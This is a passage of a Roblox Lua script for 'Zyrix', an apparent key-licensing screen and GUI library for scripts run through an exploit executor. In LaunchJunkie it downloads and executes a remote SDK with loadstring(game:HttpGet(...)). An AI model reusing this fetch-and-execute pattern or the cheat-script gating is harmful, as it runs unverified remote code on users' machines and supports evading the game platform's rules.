        local siWrap=makeFrame({Size=UDim2.new(0,siW+4,0,siW+4),Position=UDim2.new(0,14,0.5,0),AnchorPoint=Vector2.new(0,0.5),BackgroundColor3=T.Accent,BackgroundTransparency=0.88,BorderSizePixel=0,Parent=sf})
        applyCorner(siWrap,UDim.new(0,5)) applyStroke(siWrap,T.Accent,1,0.6)
        makeImage({Size=UDim2.new(0,siW,0,siW),Position=UDim2.new(0.5,0,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),Image=getShopIcon(),ImageColor3=T.Text,Parent=siWrap})
        local bBtnW=62
        local txX=14+siW+4+10
        local txW=winW-txX-bBtnW-14-8
        makeLabel({Size=UDim2.new(0,txW,0,17),Position=UDim2.new(0,txX,0,9),Text=Zyrix.Shop.Title,TextColor3=T.Text,TextSize=mobile and 12 or 13,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,Parent=sf})
        makeLabel({Size=UDim2.new(0,txW,0,13),Position=UDim2.new(0,txX,0,28),Text=Zyrix.Shop.Subtitle,TextColor3=T.TextDim,TextSize=mobile and 9 or 10,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,Parent=sf})
        local buyBtn=makeButton({Size=UDim2.new(0,bBtnW,0,28),Position=UDim2.new(1,-14,0.5,0),AnchorPoint=Vector2.new(1,0.5),BackgroundColor3=T.Accent,Parent=sf})
        applyCorner(buyBtn,UDim.new(0,5)) applyStroke(buyBtn,T.AccentHover,1,0.6)
        local bc=makeFrame({Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Parent=buyBtn})
        local bl=Instance.new("UIListLayout",bc) bl.FillDirection=Enum.FillDirection.Horizontal bl.HorizontalAlignment=Enum.HorizontalAlignment.Center bl.VerticalAlignment=Enum.VerticalAlignment.Center bl.Padding=UDim.new(0,4)
        makeImage({Size=UDim2.new(0,12,0,12),Image=getIcon("cart"),ImageColor3=T.Background,LayoutOrder=1,Parent=bc})
        makeLabel({Size=UDim2.new(0,0,0,12),AutomaticSize=Enum.AutomaticSize.X,Text=Zyrix.Shop.ButtonText,TextColor3=T.Background,TextSize=mobile and 10 or 11,Font=Enum.Font.GothamBold,LayoutOrder=2,Parent=bc})
        buyBtn.MouseEnter:Connect(function() tween(buyBtn,0.15,{BackgroundColor3=T.AccentHover}) end)
        buyBtn.MouseLeave:Connect(function() tween(buyBtn,0.15,{BackgroundColor3=T.Accent}) end)
        buyBtn.MouseButton1Click:Connect(function()
            if Zyrix.Shop.Link~="" then pcall(setclipboard,Zyrix.Shop.Link) Zyrix:Notify("Shop","Shop link copied!",2,"copy") end
        end)
    end

    local doors=CreateDoorOverlay(main,winW,winH)

    btns["user"].btn.MouseButton1Click:Connect(function()    ui.toggleUser(btns["user"].img) end)
    btns["discord"].btn.MouseButton1Click:Connect(function()
        if Zyrix.Links.Discord~="" then Zyrix:Notify("Discord","Invite link copied!",2,"discord") pcall(setclipboard,Zyrix.Links.Discord) end
    end)
    if hasCL then btns["changelog"].btn.MouseButton1Click:Connect(function() ui.toggleCL(btns["changelog"].img) end) end

    local spinConn,dotsThread
    local function setStatus(state,custom)
        if spinConn then spinConn:Disconnect() spinConn=nil statIcon.Rotation=0 end
        if dotsThread then task.cancel(dotsThread) dotsThread=nil end
        local col,img,txt=T.StatusIdle,getIcon("lock"),custom or "No key detected"
        if state=="verifying" then
            col,img,txt=T.Accent,getIcon("loading"),"Verifying key"
            spinConn=RunService.Heartbeat:Connect(function(dt)
                if statIcon and statIcon.Parent then statIcon.Rotation=(statIcon.Rotation+dt*360)%360
                else if spinConn then spinConn:Disconnect() end end
            end)
            local dots,di={".","..",  "...",""},1
            dotsThread=task.spawn(function()
                while statLabel and statLabel.Parent and statLabel.Text:find("Verifying",1,true) do
                    statLabel.Text=txt..dots[di] di=(di%#dots)+1 task.wait(0.38)
                end
            end)
        elseif state=="success" then col,img,txt=T.Success,getIcon("check"),custom or "Access Granted"
        elseif state=="error"   then col,img,txt=T.Error,  getIcon("alert"),custom or "Invalid Key" end
        tween(statLabel,0.25,{TextColor3=col}) tween(statIcon,0.25,{ImageColor3=col})
        statLabel.Text=txt statIcon.Image=img
    end

    local function exitDoors(cb)
        ui.closeAllPanels(btns["user"].img,hasCL and btns["changelog"].img or nil,function()
            doors.close(function() task.wait(0.25) if cb then cb() end end)
        end)
    end

    closeBtn.MouseButton1Click:Connect(function()
        Zyrix:Notify("Goodbye","See you next time!",2,"close")
        exitDoors(function()
            fullCleanup() hideBackground()
            tween(container,0.38,{Position=UDim2.new(0.5,0,-0.5,0)})
            tween(main,0.28,{BackgroundTransparency=1})
            task.wait(0.4) sg:Destroy()
            if Zyrix.Callbacks.OnClose then Zyrix.Callbacks.OnClose() end
        end)
    end)

    local function handleRedeem()
        local key=tb.Text:gsub("%s+","")
        if key=="" then Zyrix:Notify("Error","Please enter your key",3,"warning") return end
        setStatus("verifying") redeemBtn.Active=false task.wait(0.28)
        local valid,errMsg=false,"Invalid key"
        if Internal.ValidateFunction then
            local ok,res,msg=pcall(Internal.ValidateFunction,key)
            if ok then
                if type(res)=="table" then
                    valid=res.valid==true
                    local eMap={KEY_INVALID="Key not found",KEY_EXPIRED="Key has expired",HWID_BANNED="Hardware banned",KEY_INVALIDATED="Key was revoked",ALREADY_USED="One-time key already used",HWID_MISMATCH="HWID limit reached",SERVICE_NOT_FOUND="Service not found",SERVICE_MISMATCH="Wrong service",PREMIUM_REQUIRED="Premium required",ERROR="Network error"}
                    local ec=res.error or "Unknown"
                    errMsg=eMap[ec] or res.message or ec
                    if ec=="HWID_BANNED" then task.delay(2,function() cloneref(Players.LocalPlayer):Kick("Hardware banned") end) end
                elseif type(res)=="boolean" then valid=res errMsg=msg or "Invalid key" end
            end
        end
        redeemBtn.Active=true
        if valid then
            saveKey(key) getgenv().SCRIPT_KEY=key getgenv().ZyrixLoaded=false
            setStatus("success") Zyrix:Notify("Success","Key validated successfully!",2,"success") task.wait(0.9)
            exitDoors(function()
                disableBlur() hideBackground()
                tween(container,0.38,{Position=UDim2.new(0.5,0,-0.5,0)})
                tween(main,0.28,{BackgroundTransparency=1})
                task.wait(0.4) sg:Destroy()
                if not Internal.IsJunkieMode and Zyrix.Callbacks.OnSuccess then Zyrix.Callbacks.OnSuccess() end
            end)
        else
            setStatus("error",errMsg) Zyrix:Notify("Invalid",errMsg,4,"error")
            if Zyrix.Callbacks.OnFail then Zyrix.Callbacks.OnFail(errMsg) end
        end
    end

    redeemBtn.MouseButton1Click:Connect(handleRedeem)
    tb.FocusLost:Connect(function(enter) if enter then handleRedeem() end end)
    getKeyBtn.MouseButton1Click:Connect(function()
        if Zyrix.Links.GetKey~="" then
            Zyrix:Notify("Copied","Key link copied!",3,"copy")
            pcall(setclipboard,Zyrix.Links.GetKey)
        else
            Zyrix:Notify("Error","No key link configured",3,"warning")
        end
    end)

    setupDragging(header,container)
    tween(container,0.45,{Position=UDim2.new(0.5,0,0.45,0)})
    task.wait(0.55)
    doors.open(function()
        task.wait(0.18) ui.toggleUser(btns["user"].img)
        if hasCL then task.wait(0.28) ui.toggleCL(btns["changelog"].img) end
    end)
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  PUBLIC API
-- ═══════════════════════════════════════════════════════════════════════════════
function Zyrix:Launch()
    Internal.IsJunkieMode    = false
    Internal.ValidateFunction = Zyrix.Callbacks.OnVerify
    local existingKey = getgenv().SCRIPT_KEY
    if existingKey and existingKey ~= "" then
        if existingKey=="KEYLESS" or (Internal.ValidateFunction and validateKey(existingKey,Internal.ValidateFunction)) then
            Zyrix:Notify("Executed","Script loaded successfully!",2,"success")
            if Zyrix.Callbacks.OnSuccess then Zyrix.Callbacks.OnSuccess() end return
        end
        getgenv().SCRIPT_KEY=nil
    end
    getgenv().ZyrixClosed=false
    BuildBackgroundUI()
    EnsureIconsReady(function()
        if Zyrix.Options.Keyless==true then
            if not Zyrix.Options.KeylessUI then handleKeylessSkip() return end
            BuildKeylessUI()
            while not getgenv().SCRIPT_KEY do task.wait(0.1) end
            return
        end
        if Zyrix.Storage.AutoLoad and Internal.ValidateFunction then
            local saved=loadKey()
            if saved and saved~="" then
                Zyrix:Notify("Checking","Validating saved key...",2,"shield") task.wait(0.45)
                if validateKey(saved,Internal.ValidateFunction) then
                    getgenv().SCRIPT_KEY=saved
                    Zyrix:Notify("Welcome Back","Key validated!",2,"success")
                    hideBackground()
                    if Zyrix.Callbacks.OnSuccess then Zyrix.Callbacks.OnSuccess() end return
                else
                    clearKey() Zyrix:Notify("Expired","Saved key is no longer valid",3,"warning") task.wait(0.8)
                end
            end
        end
        BuildKeyUI()
        while not getgenv().SCRIPT_KEY do task.wait(0.1) end
    end)
end

function Zyrix:LaunchJunkie(config)
    assert(config and config.Service and config.Identifier and config.Provider,"Config required: Service, Identifier, Provider")
    Internal.IsJunkieMode=true
    local existingKey=getgenv().SCRIPT_KEY
    if existingKey and existingKey~="" then
        Zyrix:Notify("Executed","Script loaded successfully!",2,"success")
        if Zyrix.Callbacks.OnSuccess then Zyrix.Callbacks.OnSuccess() end return
    end
    getgenv().ZyrixClosed=false
    BuildBackgroundUI()
    EnsureIconsReady(function()
        local ok,Junkie=pcall(function() return loadstring(game:HttpGet("https://jnkie.com/sdk/library.lua"))() end)
        if not ok or not Junkie then Zyrix:Notify("Error","Failed to load Junkie SDK",5,"error") return end
        Junkie.service=config.Service Junkie.identifier=config.Identifier Junkie.provider=config.Provider
        Internal.Junkie=Junkie
        if Zyrix.Links.GetKey=="" then pcall(function() Zyrix.Links.GetKey=Junkie.get_key_link() end) end
        Internal.ValidateFunction=function(key) return Junkie.check_key(key) end
        if Zyrix.Options.Keyless==nil then
            local ks,kr=pcall(function() return Junkie.check_key("KEYLESS") end)
            if ks and kr and kr.valid then
                if not Zyrix.Options.KeylessUI then handleKeylessSkip() return end
                BuildKeylessUI() while not getgenv().SCRIPT_KEY do task.wait(0.1) end return
            end
        elseif Zyrix.Options.Keyless==true then
            if not Zyrix.Options.KeylessUI then handleKeylessSkip() return end
            BuildKeylessUI() while not getgenv().SCRIPT_KEY do task.wait(0.1) end return
        end
        if Zyrix.Storage.AutoLoad then
            local saved=loadKey()
            if saved and saved~="" then
                Zyrix:Notify("Checking","Validating saved key...",2,"shield") task.wait(0.45)
                local vs,vr=pcall(function() return Junkie.check_key(saved) end)
                if vs and vr and vr.valid then
                    getgenv().SCRIPT_KEY=saved
                    Zyrix:Notify("Welcome Back","Key validated!",2,"success")
                    hideBackground()
                    if Zyrix.Callbacks.OnSuccess then Zyrix.Callbacks.OnSuccess() end return
                else
                    clearKey() Zyrix:Notify("Expired","Saved key is no longer valid",3,"warning") task.wait(0.8)
                end
            end
        end
        BuildKeyUI()
        while not getgenv().SCRIPT_KEY do task.wait(0.1) end
    end)
end

function Zyrix:GetSavedKey()   return loadKey() end
function Zyrix:ClearSavedKey() return clearKey() end

getgenv().Zyrix = Zyrix

-- ═══════════════════════════════════════════════════════════════════════════════
--  ZYRIX UI  —  full featured GUI (opens after key accepted)
-- ═══════════════════════════════════════════════════════════════════════════════
local ZyrixUI = {}
ZyrixUI.__index = ZyrixUI
getgenv().ZyrixUI = ZyrixUI

do
    local UIS  = cloneref(game:GetService("UserInputService"))
    local TS   = cloneref(game:GetService("TweenService"))
    local RS   = cloneref(game:GetService("RunService"))

    -- ── theme (same monochrome palette) ───────────────────────────────────────
    local UI_T = {
        BG          = Color3.fromRGB(8,   8,   8),
        Sidebar     = Color3.fromRGB(12,  12,  12),
        Panel       = Color3.fromRGB(16,  16,  16),
        Element     = Color3.fromRGB(22,  22,  22),
        ElementHov  = Color3.fromRGB(30,  30,  30),
        Stroke      = Color3.fromRGB(45,  45,  45),
        Accent      = Color3.fromRGB(255, 255, 255),
        AccentDim   = Color3.fromRGB(160, 160, 160),
        Text        = Color3.fromRGB(255, 255, 255),
        TextDim     = Color3.fromRGB(100, 100, 100),
        TextOff     = Color3.fromRGB(55,  55,  55),
        Toggle_On   = Color3.fromRGB(255, 255, 255),
        Toggle_Off  = Color3.fromRGB(38,  38,  38),
        Slider_Fill = Color3.fromRGB(255, 255, 255),
        Slider_BG   = Color3.fromRGB(30,  30,  30),
        Danger      = Color3.fromRGB(255, 80,  80),
        Success     = Color3.fromRGB(120, 255, 120),
    }

    local FONT_B  = Enum.Font.GothamBold
    local FONT    = Enum.Font.Gotham
    local CORNER  = UDim.new(0, 6)
    local CORNER2 = UDim.new(0, 4)

    -- ── helpers ───────────────────────────────────────────────────────────────
    local function tw(obj, t, props, style)
        TS:Create(obj, TweenInfo.new(t, style or Enum.EasingStyle.Quart), props):Play()
    end
    local function corner(p, r)
        local c = Instance.new("UICorner", p); c.CornerRadius = r or CORNER; return c
    end
    local function stroke(p, col, thick, trans)
        local s = Instance.new("UIStroke", p)
        s.Color = col or UI_T.Stroke; s.Thickness = thick or 1
        s.Transparency = trans or 0; return s
    end
    local function frame(props)
        local f = Instance.new("Frame")
        f.BorderSizePixel = 0
        for k,v in pairs(props) do f[k] = v end; return f
    end
    local function label(props)
        local l = Instance.new("TextLabel")
        l.BackgroundTransparency = 1; l.Font = FONT_B
        for k,v in pairs(props) do l[k] = v end; return l
    end
    local function btn(props)
        local b = Instance.new("TextButton")
        b.AutoButtonColor = false; b.Text = ""; b.BorderSizePixel = 0
        for k,v in pairs(props) do b[k] = v end; return b
    end
    local function img(props)
        local i = Instance.new("ImageLabel")
        i.BackgroundTransparency = 1; i.ScaleType = Enum.ScaleType.Fit
        for k,v in pairs(props) do i[k] = v end; return i
    end
    local function scrollFrame(parent, size, pos)
        local sf = Instance.new("ScrollingFrame")
        sf.Size = size; sf.Position = pos or UDim2.new(0,0,0,0)
        sf.BackgroundTransparency = 1; sf.BorderSizePixel = 0
        sf.ScrollBarThickness = 3
        sf.ScrollBarImageColor3 = UI_T.Stroke
        sf.CanvasSize = UDim2.new(0,0,0,0)
        sf.AutomaticCanvasSize = Enum.AutomaticSize.Y
        sf.Parent = parent; return sf
    end
    local function listLayout(parent, padding, dir)
        local l = Instance.new("UIListLayout", parent)
        l.Padding = UDim.new(0, padding or 6)
        l.SortOrder = Enum.SortOrder.LayoutOrder
        l.FillDirection = dir or Enum.FillDirection.Vertical
        return l
    end
    local function pad(parent, t, b, l, r)
        local p = Instance.new("UIPadding", parent)
        p.PaddingTop    = UDim.new(0, t or 0)
        p.PaddingBottom = UDim.new(0, b or 0)
        p.PaddingLeft   = UDim.new(0, l or 0)
        p.PaddingRight  = UDim.new(0, r or 0)
    end

    -- ── dragging ──────────────────────────────────────────────────────────────
    local function makeDraggable(handle, root)
        local dragging, ds, dp
        handle.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or
               i.UserInputType == Enum.UserInputType.Touch then
                dragging = true; ds = i.Position; dp = root.Position
                i.Changed:Connect(function()
                    if i.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if not dragging then return end
            if i.UserInputType == Enum.UserInputType.MouseMovement or
               i.UserInputType == Enum.UserInputType.Touch then
                local d = i.Position - ds
                root.Position = UDim2.new(dp.X.Scale, dp.X.Offset+d.X, dp.Y.Scale, dp.Y.Offset+d.Y)
            end
        end)
    end

    -- ── Window ────────────────────────────────────────────────────────────────
    local WIN_W = 680
    local WIN_H = 440
    local SIDEBAR_W = 160
    local TAB_H = 36

    local guiRef = nil
    local currentTab = nil
    local tabButtons = {}
    local tabPanels  = {}

    local function switchTab(name)
        if currentTab == name then return end
        currentTab = name
        for tname, tbtn in pairs(tabButtons) do
            local isActive = tname == name
            tw(tbtn.bg,  0.18, {BackgroundColor3 = isActive and UI_T.Element or Color3.fromRGB(0,0,0)})
            tw(tbtn.ind, 0.18, {BackgroundTransparency = isActive and 0 or 1})
            tw(tbtn.lbl, 0.18, {TextColor3 = isActive and UI_T.Text or UI_T.TextDim})
        end
        for tname, panel in pairs(tabPanels) do
            panel.Visible = tname == name
        end
    end

    -- ── Section header ────────────────────────────────────────────────────────
    local function addSection(scroll, title)
        local sec = frame({
            Size = UDim2.new(1, 0, 0, 28),
            BackgroundTransparency = 1,
            LayoutOrder = 0,
            Parent = scroll,
        })
        label({
            Size = UDim2.new(1, 0, 1, 0),
            Text = title:upper(),
            TextColor3 = UI_T.TextDim,
            TextSize = 10,
            Font = FONT_B,
            TextXAlignment = Enum.TextXAlignment.Left,
            Parent = sec,
        })
        local line = frame({Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),BackgroundColor3=UI_T.Stroke,Parent=sec})
        return sec
    end

    -- ── Toggle ────────────────────────────────────────────────────────────────
    local function addToggle(scroll, title, desc, default, callback, lo)
        local state = default or false
        local el = frame({
            Size = UDim2.new(1, 0, 0, desc and 52 or 40),
            BackgroundColor3 = UI_T.Element,
            LayoutOrder = lo or 0,
            Parent = scroll,
        })
        corner(el) stroke(el, UI_T.Stroke, 1, 0)

        label({
            Size = UDim2.new(1, -62, 0, 20),
            Position = UDim2.new(0, 12, 0, desc and 8 or 10),
            Text = title, TextColor3 = UI_T.Text,
            TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
            Parent = el,
        })
        if desc then
            label({
                Size = UDim2.new(1, -62, 0, 16),
                Position = UDim2.new(0, 12, 0, 28),
                Text = desc, TextColor3 = UI_T.TextDim,
                TextSize = 10, Font = FONT,
                TextXAlignment = Enum.TextXAlignment.Left,
                Parent = el,
            })
        end

        -- pill toggle
        local pillBG = frame({
            Size = UDim2.new(0, 36, 0, 20),
            Position = UDim2.new(1, -46, 0.5, 0),
            AnchorPoint = Vector2.new(1, 0.5),
            BackgroundColor3 = state and UI_T.Toggle_On or UI_T.Toggle_Off,
            Parent = el,
        })
        corner(pillBG, UDim.new(1,0))
        local knob = frame({
            Size = UDim2.new(0, 14, 0, 14),
            Position = UDim2.new(state and 1 or 0, state and -17 or 3, 0.5, 0),
            AnchorPoint = Vector2.new(0, 0.5),
            BackgroundColor3 = state and UI_T.BG or UI_T.AccentDim,
            Parent = pillBG,
        })
        corner(knob, UDim.new(1,0))

        local clickBtn = btn({Size=UDim2.new(1,0,1,0), BackgroundTransparency=1, Parent=el})
        clickBtn.MouseButton1Click:Connect(function()
            state = not state
            tw(pillBG, 0.2, {BackgroundColor3 = state and UI_T.Toggle_On or UI_T.Toggle_Off})
            tw(knob,   0.2, {
                Position = UDim2.new(state and 1 or 0, state and -17 or 3, 0.5, 0),
                BackgroundColor3 = state and UI_T.BG or UI_T.AccentDim,
            })
            if callback then pcall(callback, state) end
        end)
        el.MouseEnter:Connect(function() tw(el, 0.15, {BackgroundColor3=UI_T.ElementHov}) end)
        el.MouseLeave:Connect(function() tw(el, 0.15, {BackgroundColor3=UI_T.Element}) end)

        return {SetValue = function(v)
            state = v
            tw(pillBG,0.2,{BackgroundColor3=state and UI_T.Toggle_On or UI_T.Toggle_Off})
            tw(knob,  0.2,{Position=UDim2.new(state and 1 or 0, state and -17 or 3, 0.5, 0), BackgroundColor3=state and UI_T.BG or UI_T.AccentDim})
        end, GetValue = function() return state end}
    end

    -- ── Slider ────────────────────────────────────────────────────────────────
    local function addSlider(scroll, title, min, max, default, callback, lo)
        min = min or 0; max = max or 100; default = math.clamp(default or min, min, max)
        local value = default
        local el = frame({
            Size = UDim2.new(1, 0, 0, 58),
            BackgroundColor3 = UI_T.Element,
            LayoutOrder = lo or 0,
            Parent = scroll,
        })
        corner(el) stroke(el, UI_T.Stroke, 1, 0)

        local titleLbl = label({
            Size = UDim2.new(1, -12, 0, 18),
            Position = UDim2.new(0, 12, 0, 8),
            Text = title, TextColor3 = UI_T.Text,
            TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
            Parent = el,
        })
        local valLbl = label({
            Size = UDim2.new(0, 50, 0, 18),
            Position = UDim2.new(1, -62, 0, 8),
            Text = tostring(value), TextColor3 = UI_T.AccentDim,
            TextSize = 12, TextXAlignment = Enum.TextXAlignment.Right,
            Parent = el,
        })

        local track = frame({
            Size = UDim2.new(1, -24, 0, 4),
            Position = UDim2.new(0, 12, 0, 36),
            BackgroundColor3 = UI_T.Slider_BG,
            Parent = el,
        })
        corner(track, UDim.new(1,0))

        local fill = frame({
            Size = UDim2.new((value-min)/(max-min), 0, 1, 0),
            BackgroundColor3 = UI_T.Slider_Fill,
            Parent = track,
        })
        corner(fill, UDim.new(1,0))

        local knob = frame({
            Size = UDim2.new(0, 12, 0, 12),
            Position = UDim2.new((value-min)/(max-min), 0, 0.5, 0),
            AnchorPoint = Vector2.new(0.5, 0.5),
            BackgroundColor3 = UI_T.Accent,
            Parent = track,
        })
        corner(knob, UDim.new(1,0))

        local dragging = false
        local function updateSlider(inputPos)
            local absPos = track.AbsolutePosition.X
            local absSize = track.AbsoluteSize.X
            local rel = math.clamp((inputPos - absPos) / absSize, 0, 1)
            value = math.floor(min + (max - min) * rel + 0.5)
            local pct = (value - min) / (max - min)
            fill.Size = UDim2.new(pct, 0, 1, 0)
            knob.Position = UDim2.new(pct, 0, 0.5, 0)
            valLbl.Text = tostring(value)
            if callback then pcall(callback, value) end
        end

        local hitbox = btn({Size=UDim2.new(1,0,0,24),Position=UDim2.new(0,0,0,26),BackgroundTransparency=1,Parent=el})
        hitbox.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or
               i.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                updateSlider(i.Position.X)
            end
        end)
        UIS.InputEnded:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or
               i.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if not dragging then return end
            if i.UserInputType == Enum.UserInputType.MouseMovement or
               i.UserInputType == Enum.UserInputType.Touch then
                updateSlider(i.Position.X)
            end
        end)

        el.MouseEnter:Connect(function() tw(el,0.15,{BackgroundColor3=UI_T.ElementHov}) end)
        el.MouseLeave:Connect(function() tw(el,0.15,{BackgroundColor3=UI_T.Element}) end)

        return {
            SetValue = function(v)
                value = math.clamp(v,min,max)
                local pct=(value-min)/(max-min)
                fill.Size=UDim2.new(pct,0,1,0)
                knob.Position=UDim2.new(pct,0,0.5,0)
                valLbl.Text=tostring(value)
            end,
            GetValue = function() return value end,
        }
    end

    -- ── Button ────────────────────────────────────────────────────────────────
    local function addButton(scroll, title, desc, callback, lo)
        local el = frame({
            Size = UDim2.new(1, 0, 0, desc and 52 or 40),
            BackgroundColor3 = UI_T.Element,
            LayoutOrder = lo or 0,
            Parent = scroll,
        })
        corner(el) stroke(el, UI_T.Stroke, 1, 0)

        label({
            Size = UDim2.new(1, -50, 0, 20),
            Position = UDim2.new(0, 12, 0, desc and 8 or 10),
            Text = title, TextColor3 = UI_T.Text,
            TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
            Parent = el,
        })
        if desc then
            label({
                Size = UDim2.new(1, -24, 0, 16),
                Position = UDim2.new(0, 12, 0, 28),
                Text = desc, TextColor3 = UI_T.TextDim,
                TextSize = 10, Font = FONT,
                TextXAlignment = Enum.TextXAlignment.Left,
                Parent = el,
            })
        end

        -- arrow indicator
        label({
            Size = UDim2.new(0, 20, 1, 0),
            Position = UDim2.new(1, -30, 0, 0),
            Text = "›", TextColor3 = UI_T.TextDim,
            TextSize = 20, Font = FONT_B,
            Parent = el,
        })

        local clickBtn = btn({Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Parent=el})
        clickBtn.MouseButton1Click:Connect(function()
            tw(el,0.08,{BackgroundColor3=UI_T.Stroke})
            task.delay(0.12,function() tw(el,0.15,{BackgroundColor3=UI_T.Element}) end)
            if callback then pcall(callback) end
        end)
        el.MouseEnter:Connect(function() tw(el,0.15,{BackgroundColor3=UI_T.ElementHov}) end)
        el.MouseLeave:Connect(function() tw(el,0.15,{BackgroundColor3=UI_T.Element}) end)
    end

    -- ── TextBox ───────────────────────────────────────────────────────────────
    local function addTextBox(scroll, title, placeholder, default, callback, lo)
        local el = frame({
            Size = UDim2.new(1, 0, 0, 62),
            BackgroundColor3 = UI_T.Element,
            LayoutOrder = lo or 0,
            Parent = scroll,
        })
        corner(el) stroke(el, UI_T.Stroke, 1, 0)

        label({
            Size = UDim2.new(1, -12, 0, 18),
            Position = UDim2.new(0, 12, 0, 6),
            Text = title, TextColor3 = UI_T.Text,
            TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
            Parent = el,
        })

        local inputBG = frame({
            Size = UDim2.new(1, -24, 0, 26),
            Position = UDim2.new(0, 12, 0, 28),
            BackgroundColor3 = UI_T.BG,
            Parent = el,
        })
        corner(inputBG, CORNER2)
        local inputStr = applyStroke(inputBG, UI_T.Stroke, 1, 0)

        local tb2 = Instance.new("TextBox")
        tb2.Size = UDim2.new(1, -16, 1, 0)
        tb2.Position = UDim2.new(0, 8, 0, 0)
        tb2.BackgroundTransparency = 1
        tb2.Text = default or ""
        tb2.PlaceholderText = placeholder or "Type here..."
        tb2.PlaceholderColor3 = UI_T.TextOff
        tb2.TextColor3 = UI_T.Text
        tb2.TextSize = 12
        tb2.Font = FONT
        tb2.ClearTextOnFocus = false
        tb2.TextXAlignment = Enum.TextXAlignment.Left
        tb2.Parent = inputBG
        tb2.Focused:Connect(function()   tw(inputStr,0.15,{Transparency=0, Color=UI_T.Accent}) end)
        tb2.FocusLost:Connect(function(enter)
            tw(inputStr,0.15,{Transparency=0, Color=UI_T.Stroke})
            if enter and callback then pcall(callback, tb2.Text) end
        end)

        el.MouseEnter:Connect(function() tw(el,0.15,{BackgroundColor3=UI_T.ElementHov}) end)
        el.MouseLeave:Connect(function() tw(el,0.15,{BackgroundColor3=UI_T.Element}) end)

        return {
            GetValue = function() return tb2.Text end,
            SetValue = function(v) tb2.Text = v end,
        }
    end

    -- ── Dropdown ──────────────────────────────────────────────────────────────
    local function addDropdown(scroll, title, options, default, callback, lo)
        local selected = default or (options and options[1]) or ""
        local isOpen = false

        local el = frame({
            Size = UDim2.new(1, 0, 0, 40),
            BackgroundColor3 = UI_T.Element,
            LayoutOrder = lo or 0,
            ClipsDescendants = false,
            ZIndex = 5,
            Parent = scroll,
        })
        corner(el) stroke(el, UI_T.Stroke, 1, 0)

        label({
            Size = UDim2.new(0.5, 0, 1, 0),
            Position = UDim2.new(0, 12, 0, 0),
            Text = title, TextColor3 = UI_T.Text,
            TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
            ZIndex = 5, Parent = el,
        })

        local valueLbl = label({
            Size = UDim2.new(0.45, 0, 1, 0),
            Position = UDim2.new(0.5, -20, 0, 0),
            Text = selected, TextColor3 = UI_T.AccentDim,
            TextSize = 12, TextXAlignment = Enum.TextXAlignment.Right,
            ZIndex = 5, Parent = el,
        })
        local arrow = label({
            Size = UDim2.new(0, 20, 1, 0),
            Position = UDim2.new(1, -26, 0, 0),
            Text = "▾", TextColor3 = UI_T.TextDim,
            TextSize = 13, ZIndex = 5, Parent = el,
        })

        -- dropdown list
        local listHolder = frame({
            Size = UDim2.new(1, 0, 0, 0),
            Position = UDim2.new(0, 0, 1, 4),
            BackgroundColor3 = UI_T.Panel,
            ClipsDescendants = true,
            ZIndex = 10, Parent = el,
        })
        corner(listHolder) stroke(listHolder, UI_T.Stroke, 1, 0)
        local listLayout2 = listLayout(listHolder, 1)
        listLayout2.Padding = UDim.new(0,0)

        local itemH = 30
        local maxVisible = math.min(#options, 5)

        for _, opt in ipairs(options or {}) do
            local row = btn({
                Size = UDim2.new(1,0,0,itemH),
                BackgroundColor3 = UI_T.Panel,
                ZIndex = 11, Parent = listHolder,
            })
            label({
                Size = UDim2.new(1,-20,1,0),
                Position = UDim2.new(0,12,0,0),
                Text = opt, TextColor3 = UI_T.Text,
                TextSize = 12, TextXAlignment = Enum.TextXAlignment.Left,
                ZIndex = 11, Parent = row,
            })
            row.MouseEnter:Connect(function() tw(row,0.1,{BackgroundColor3=UI_T.Element}) end)
            row.MouseLeave:Connect(function() tw(row,0.1,{BackgroundColor3=UI_T.Panel}) end)
            row.MouseButton1Click:Connect(function()
                selected = opt
                valueLbl.Text = opt
                isOpen = false
                tw(arrow,0.15,{Rotation=0})
                tw(listHolder,0.2,{Size=UDim2.new(1,0,0,0)})
                el.Size = UDim2.new(1,0,0,40)
                if callback then pcall(callback, opt) end
            end)
        end

        local clickBtn2 = btn({Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,ZIndex=6,Parent=el})
        clickBtn2.MouseButton1Click:Connect(function()
            isOpen = not isOpen
            if isOpen then
                tw(arrow,0.15,{Rotation=180})
                tw(listHolder,0.2,{Size=UDim2.new(1,0,0,itemH*maxVisible)})
                el.Size = UDim2.new(1,0,0,40+itemH*maxVisible+4)
            else
                tw(arrow,0.15,{Rotation=0})
                tw(listHolder,0.2,{Size=UDim2.new(1,0,0,0)})
                el.Size = UDim2.new(1,0,0,40)
            end
        end)
        el.MouseEnter:Connect(function() tw(el,0.15,{BackgroundColor3=UI_T.ElementHov}) end)
        el.MouseLeave:Connect(function() tw(el,0.15,{BackgroundColor3=UI_T.Element}) end)

        return {
            GetValue = function() return selected end,
            SetValue = function(v)
                selected = v; valueLbl.Text = v
            end,
        }
    end

    -- ── Keybind ───────────────────────────────────────────────────────────────
    local function addKeybind(scroll, title, default, callback, lo)
        local key = default or Enum.KeyCode.Unknown
        local listening = false
        local el = frame({
            Size = UDim2.new(1,0,0,40),
            BackgroundColor3 = UI_T.Element,
            LayoutOrder = lo or 0,
            Parent = scroll,
        })
        corner(el) stroke(el, UI_T.Stroke, 1, 0)

        label({
            Size = UDim2.new(0.6,0,1,0),
            Position = UDim2.new(0,12,0,0),
